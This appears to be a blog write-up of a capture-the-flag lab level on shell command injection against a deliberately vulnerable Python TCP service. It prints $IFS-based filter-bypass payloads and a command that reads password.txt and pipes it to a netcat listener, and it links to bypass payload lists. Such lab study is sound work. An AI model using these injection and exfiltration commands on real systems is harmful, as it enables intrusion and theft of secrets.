---
title:  "[CTF] Binary Master Lieutenant - 3"
---

![Logo](/assets/images/belts-brown.png)


In this post we'll continue with the third level from the [Lieutenant](https://www.certifiedsecure.com/certification/view/37) set of challenges from **Certified Secure Binary Mastery**. We will be dealing with another classic vulnerability - _shell command injection_. I really enjoyed this level and I believe it is quite clever.

To review the previous levels, check the links below:
* [Binary Master: Ensign - Level 1](https://livz.github.io/2016/01/07/binary-master-ensign-1.html)
* [Binary Master: Ensign - Level 2](https://livz.github.io/2016/01/14/binary-master-ensign-2.html)
* [Binary Master: Ensign - Level 3](https://livz.github.io/2016/01/21/binary-master-ensign-3.html)
* [Binary Master: Ensign - Level 4](https://livz.github.io/2016/01/28/binary-master-ensign-4.html)
* [Binary Master: Ensign - Level 5](https://livz.github.io/2016/02/09/binary-master-ensign-5.html)
* [Binary Master: Lieutenant - Level 1](https://livz.github.io/2016/02/16/binary-master-lieutenant-1.html)
* [Binary Master: Lieutenant - Level 2](https://livz.github.io/2016/02/23/binary-master-lieutenant-2.html)

Before we begin, here's a list of resources containing different tricks to bypass filters meant to prevent command injection:
* [OS Command execution](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/os-cmd-execution)
* [Bypassing bash command injections restrictions](http://thomasforrer.blogspot.co.uk/2014/07/bypassing-bash-command-injections.html)
* [Command Injection Without Spaces](http://www.betterhacker.com/2016/10/command-injection-without-spaces.html)
* [Bash Brace Expansion Cleverness](https://jon.oberheide.org/blog/2008/09/04/bash-brace-expansion-cleverness/)
 
## 0 - Discovery
```python
#!/usr/bin/env python

import sys
import SocketServer
import os
import string
import threading

HOST = '127.0.0.1'
PORT = 9999
PASSWORD = "iknowthepassword"

class SysTCPHandler(SocketServer.BaseRequestHandler):

    def handle(self):
        self.request.sendall('Password: ')
        
        if self.request.recv(1024).strip() == PASSWORD:                    [1]
            self.request.sendall('$ ')
            cmd = self.request.recv(1024)
    
            while len(cmd) > 0:
                os.system(self.filter(cmd))
                self.request.sendall('> output sent to console\n')
                self.request.sendall('$ ')
                cmd = self.request.recv(1024)

    def filter(self, cmd):                                                 [2]
        # We only want people to pass arguments
        bad_chars = " \t<"

        return cmd.translate(None, bad_chars);

if __name__ == '__main__':
    # We don't need this anymore since it's provided by the upstart service
    #os.chroot('/chroot')
    
    try:
        os.setgid(1005)
        os.setuid(1005)
    except OSError, e:
        sys.exit(-1)
    
    server = SocketServer.ForkingTCPServer((HOST, PORT), SysTCPHandler)
    server.serve_forever()
```

Let's spend a few moments to understand how this program works. Notice that upon starting, the program changes its group and user ids to level4 (uid=1005, gid=1005):

```python
    try:
        os.setgid(1005)
        os.setuid(1005)
    except OSError, e:
        sys.exit(-1)
```

There is also an indication that the application will be chroot-ed to **/chroot**. If we inspect this folder, we can see it's owned by root, with no write permissions for other users. That means we'll have a problem - **the python script will not be able to write anything there**:

```
drwxr-xr-x  8 root root  4096 May 12 12:42 chroot
```

Inside this folder we have an interesting file, for which the python script **will have access** - _password.txt_:

```
-rw-r-----  1 root level4   18 May 12 12:36 password.txt
```

After dealing with permissions, the script starts a TCP server listening on port 9999. After checking a hardcoded password at **[1]**, the script will read a command from the user, filter it and then execute it. Filtering is done at **[2]**, based on a blacklist of forbidden characters, including _Space_, _Tab_ and _<_.

## 1 - Vulnerability
 
Although having this blacklist might sound like a good idea (definitely better than nothing), in practice most of the times it is a bad idea to filter known-bad input from the user. Attackers can be very creative.

## 2 - Exploit
So let's see what's the problem. We have two issues:
* First one basically reduces to executing commands without whitespaces. 
* Secondly, we need a way to see the responses.

### Executing commands
The python script executes commands using the following syntax:

```python
os.system(filtered_cnd)
```

According to the [documentation](https://docs.python.org/2/library/os.html#os.system), _os.system_ is implemented by calling the Standard C function **_system()_**. Going further, the [man page](http://man7.org/linux/man-pages/man3/system.3.html) for _system_ function states:

```
       The system() library function uses fork(2) to create a child process
       that executes the shell command specified in command using execl(3)
       as follows:

           execl("/bin/sh", "sh", "-c", command, (char *) 0);
```           

The resources refenreced in the beginning suggest that the **$IFS** environment variable might be a good place to start. After playing with different combinations locally, I've noticed that it works fine, but whenever $IFS is followd by a number or letter, they together get interpreted as a single variable. My workaround was to define more variables when needed. 

So let's see how we can introduce a simple delay, which signifies that the command injection was successful:

```bash
$ python -c 'import os; os.system("T=10&&sleep$IFS$T")'
```

Pasting the same command into the shell of level4 produces a 10-seconds delay - it worked!


### Getting command results

Since there is no possibility to write anything on the disk and also we cannot view the output of our commands, we need to think of another way. Let's be creative. Since this level is a lot about networking, I'll use the Swiss Army Knife **nc** utility to forward any results to me. I'll establish a listener on a port greater than 1024 then trick the filter to accept my command:

```bash
(on a terminal)
$  nc -lvvp 2000

(in the level4 console)
$ MSG=hello&&IP=0&&PORT=2000&&echo$IFS$MSG|nc$IFS-nvv$IFS$IP$IFS$PORT
```

Strangely, however, nothing happens. After some thinking, I realised that the _nc_ program inside the chroot environment is just a symbolic link. Fortunately, **nc.openbsd** is also present in /chroot/bin:

```
$ ls -alh /chroot/bin/nc
lrwxrwxrwx 1 root root 20 May 12 12:36 /chroot/bin/nc -> /etc/alternatives/nc
$ ls -alh /chroot/etc/alternatives/nc
ls: cannot access /chroot/etc/alternatives/nc: No such file or directory
$ ls -alh /chroot/bin/nc.openbsd 
-rwxr-xr-x 1 root root 31K May 12 12:36 /chroot/bin/nc.openbsd
```

Let's see if we can get a simple message back:
![hello](/assets/images/bm8-0.png)

![borat](/assets/images/bm8-1.png)

## 3 - Profit

We can now read the password stored in password.txt, in the root of the chroot environment:

```bash
(in the level4 console)
$ IP=0&&PORT=2000&&cat$IFS/password.txt|nc.openbsd$IFS-nvv$IFS$IP$IFS$PORT

(on the listener)
$ nc -lvvp 2000
Listening on [0.0.0.0] (family 0, port 2000)
Connection from [127.0.0.1] port 2000 [tcp/cisco-sccp] accepted (family 2, sport 51920)
only*******s
```

This concludes the level. in the [next level](https://livz.github.io/2016/03/10/binary-master-lieutenant-4.html) we'll analyse another interestting vulnerability - [Time of check to time of use -TOCTOU](https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use).
